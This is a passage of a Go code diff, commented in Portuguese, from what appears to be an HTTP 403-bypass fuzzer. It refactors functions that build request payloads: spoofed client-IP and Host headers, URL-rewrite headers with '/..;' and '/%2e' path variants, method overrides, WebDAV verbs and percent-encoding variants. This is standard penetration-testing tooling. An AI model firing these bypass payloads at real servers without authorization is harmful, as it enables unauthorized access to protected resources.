+	for _, hk := range rewriteHeaders {
+		for _, val := range alts {
+			payloads = append(payloads, Payload{
+				URL:          baseURL,
+				ExtraHeaders: map[string]string{hk: val},
+				Method:       "GET",
+				ExtraInfo:    fmt.Sprintf("Header: %s: %s", hk, val),
+			})
+		}
+	}
+	return payloads
+}
+
+func generateMethodPayloads(parsedURL *url.URL) []Payload {
+	var payloads []Payload
+	orig := parsedURL.String()
+	methods := []string{
+		"GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD",
+		"PROPFIND", "PROPPATCH", "MKCOL", "COPY", "MOVE", "LOCK", "UNLOCK", "SEARCH",
+		"TRACE", "DEBUG",
+	}
+	for _, m := range methods {
+		payloads = append(payloads, Payload{
+			URL:          orig,
+			ExtraHeaders: map[string]string{},
+			Method:       m,
+			ExtraInfo:    fmt.Sprintf("Method: %s", m),
+		})
+	}
+
+	qOverrides := []string{"_method=DELETE", "_method=PUT", "method=DELETE"}
+	for _, qo := range qOverrides {
+		u := *parsedURL
+		if u.RawQuery == "" {
+			u.RawQuery = qo
+		} else {
+			u.RawQuery = u.RawQuery + "&" + qo
+		}
+		payloads = append(payloads, Payload{
+			URL:          u.String(),
+			Method:       "POST",
+			ExtraHeaders: map[string]string{"Content-Length": "0"},
+			ExtraInfo:    "Method override via query",
+		})
+	}
+	return payloads
+}
+
+// ================== Utils de geração ==================
 
 func add(set map[string]struct{}, base, p, rawq string) {
 	u := base + "/" + strings.TrimPrefix(p, "/")
@@ -952,150 +1169,6 @@ func addMany(set map[string]struct{}, urls []string, rawq string) {
 	}
 }
 
-// ------------------ Headers / Rewrite / Methods ------------------
-
-func generateHeadersPayloads(parsedURL *url.URL) []Payload {
-	var payloads []Payload
-	orig := parsedURL.String()
-	host := parsedURL.Host
-	path := parsedURL.Path
-	if path == "" {
-		path = "/"
-	}
-
-	headerSets := []map[string]string{
-		// IP spoof / trust
-		{"X-Forwarded-For": "127.0.0.1"},
-		{"X-Forwarded-For": "10.0.0.1"},
-		{"X-Forwarded-For": "192.168.0.1"},
-		{"X-Forwarded-For": "127.0.0.1, 10.0.0.1"},
-		{"X-Real-IP": "127.0.0.1"},
-		{"True-Client-IP": "127.0.0.1"},
-		{"X-Client-Ip": "127.0.0.1"},
-		{"X-Original-Client-IP": "127.0.0.1"},
-		{"X-Custom-IP-Authorization": "127.0.0.1"},
-
-		// Proto / TLS hints
-		{"X-Forwarded-Proto": "https"},
-		{"X-Forwarded-Proto": "http"},
-		{"Front-End-Https": "on"},
-		{"X-Forwarded-Port": "443"},
-
-		// Host tricks (pode ser intrusivo, mas útil em bypass)
-		{"Host": "127.0.0.1"},
-		{"Host": "localhost"},
-		{"X-Forwarded-Host": "127.0.0.1"},
-		{"X-Forwarded-Host": host},
-		{"X-Host": "127.0.0.1"},
-		{"X-Original-Host": host},
-
-		// Rewrite/Original URL headers
-		{"X-Original-URL": path},
-		{"X-Original-URI": path},
-		{"X-Request-URI": path},
-		{"X-Rewrite-URL": path},
-		{"X-Rewrite-Uri": path},
-		{"X-Forwarded-Uri": path},
-		{"X-Accel-Redirect": path},
-
-		// Method override
-		{"X-HTTP-Method-Override": "DELETE"},
-		{"X-HTTP-Method-Override": "PUT"},
-		{"X-Method-Override": "DELETE"},
-		{"X-HTTP-Method": "DELETE"},
-	}
-
-	for _, hs := range headerSets {
-		info := headerInfo(hs)
-		payloads = append(payloads, Payload{
-			URL:          orig,
-			ExtraHeaders: hs,
-			Method:       "GET",
-			ExtraInfo:    "Header: " + info,
-		})
-	}
-	return payloads
-}
-
-func headerInfo(h map[string]string) string {
-	parts := make([]string, 0, len(h))
-	keys := make([]string, 0, len(h))
-	for k := range h {
-		keys = append(keys, k)
-	}
-	sort.Strings(keys)
-	for _, k := range keys {
-		parts = append(parts, fmt.Sprintf("%s: %s", k, h[k]))
-	}
-	return strings.Join(parts, ", ")
-}
-
-func generateRewritePayloads(parsedURL *url.URL) []Payload {
-	var payloads []Payload
-	originalPath := parsedURL.Path
-	if originalPath == "" {
-		originalPath = "/"
-	}
-	baseURL := fmt.Sprintf("%s://%s/", parsedURL.Scheme, parsedURL.Host)
-	rewriteHeaders := []string{"X-Rewrite-Url", "X-Original-URL", "X-Custom-URL", "X-Rewrite-URL", "X-Original-URI", "X-Request-URI"}
-	alts := []string{
-		originalPath,
-		originalPath + "/.",
-		"/%2e" + originalPath,
-		"/..;" + originalPath,
-	}
-	for _, hk := range rewriteHeaders {
-		for _, val := range alts {
-			payloads = append(payloads, Payload{
-				URL:          baseURL,
-				ExtraHeaders: map[string]string{hk: val},
-				Method:       "GET",
-				ExtraInfo:    fmt.Sprintf("Header: %s: %s", hk, val),
-			})
-		}
-	}
-	return payloads
-}
-
-func generateMethodPayloads(parsedURL *url.URL) []Payload {
-	var payloads []Payload
-	orig := parsedURL.String()
-	methods := []string{
-		"GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD",
-		// WebDAV/raros
-		"PROPFIND", "PROPPATCH", "MKCOL", "COPY", "MOVE", "LOCK", "UNLOCK", "SEARCH",
-		// alguns servidores aceitam TRACE/DEBUG
-		"TRACE", "DEBUG",
-	}
-	for _, m := range methods {
-		payloads = append(payloads, Payload{
-			URL:          orig,
-			ExtraHeaders: map[string]string{},
-			Method:       m,
-			ExtraInfo:    fmt.Sprintf("Method: %s", m),
-		})
-	}
-	// Overrides via query (comuns em frameworks)
-	qOverrides := []string{"_method=DELETE", "_method=PUT", "method=DELETE"}
-	for _, qo := range qOverrides {
-		u := *parsedURL
-		if u.RawQuery == "" {
-			u.RawQuery = qo
-		} else {
-			u.RawQuery = u.RawQuery + "&" + qo
-		}
-		payloads = append(payloads, Payload{
-			URL:          u.String(),
-			Method:       "POST",
-			ExtraHeaders: map[string]string{"Content-Length": "0"},
-			ExtraInfo:    "Method override via query",
-		})
-	}
-	return payloads
-}
-
-// ------------------ Utilitários de geração ------------------
-
 func generateMultipleSemicolonPatterns(pathParts []string) []string {
 	var patterns []string
 	for i := 0; i < len(pathParts)-1; i++ {
@@ -1106,7 +1179,6 @@ func generateMultipleSemicolonPatterns(pathParts []string) []string {
 	parts := append([]string{}, pathParts...)
 	parts[len(parts)-1] = parts[len(parts)-1] + ";"
 	patterns = append(patterns, strings.Join(parts, "/"))
-
 	for i := 1; i < len(pathParts); i++ {
 		parts := append([]string{}, pathParts...)
 		parts[i] = ";" + parts[i]
@@ -1157,12 +1229,10 @@ func generateFullEncodings(s string) []string {
 	return encs
 }
 
-// percent-encode char-by-char (%, upper hex)
 func percentEncodeCharByChar(s string) []string {
 	var variants []string
 	for i := 0; i < len(s); i++ {
-		variant := s[:i] + fmt.Sprintf("%%%02X", s[i]) + s[i+1:]
-		variants = append(variants, variant)
+		variants = append(variants, s[:i]+fmt.Sprintf("%%%02X", s[i])+s[i+1:])
 	}
 	return variants
 }
